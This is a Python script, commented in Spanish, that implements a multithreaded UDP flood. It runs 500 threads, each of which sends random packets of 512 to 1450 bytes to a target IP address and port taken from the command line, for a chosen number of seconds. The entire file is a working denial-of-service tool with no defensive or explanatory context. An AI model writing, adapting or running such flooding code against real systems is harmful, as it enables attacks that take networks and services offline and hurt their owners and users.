import socket
import random
import sys
import time
import threading

def socket_worker(target_ip, target_port, duration, worker_id):
    """Worker thread con su propio socket"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    timeout = time.time() + duration
    
    while time.time() < timeout:
        try:
            data = random._urandom(random.randint(512, 1450))
            sock.sendto(data, (target_ip, target_port))
        except:
            sock.close()
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    sock.close()

def udp_sockets_threads(target_ip, target_port, duration):
    """UDP flood con múltiples sockets y threads"""
    
    threads = []
    num_threads = 500  # 500 threads = 500 sockets
    
    for i in range(num_threads):
        t = threading.Thread(target=socket_worker, args=(target_ip, target_port, duration, i))
        t.daemon = True
        t.start()
        threads.append(t)
    
    # Esperar a que termine el tiempo
    time.sleep(duration)

if __name__ == "__main__":
    if len(sys.argv) != 4:
        sys.exit(1)
    
    udp_sockets_threads(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
